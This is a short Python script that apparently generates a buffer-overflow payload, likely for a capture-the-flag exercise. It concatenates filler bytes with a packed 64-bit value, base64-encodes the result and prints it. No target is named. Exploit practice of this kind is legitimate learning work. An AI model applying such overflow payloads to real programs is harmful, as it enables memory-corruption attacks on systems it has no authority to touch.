
import sys
import struct
import base64

buf = b'rrrrrrrrrrrrr'
buf += struct.pack('<Q', 388566303722533331)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
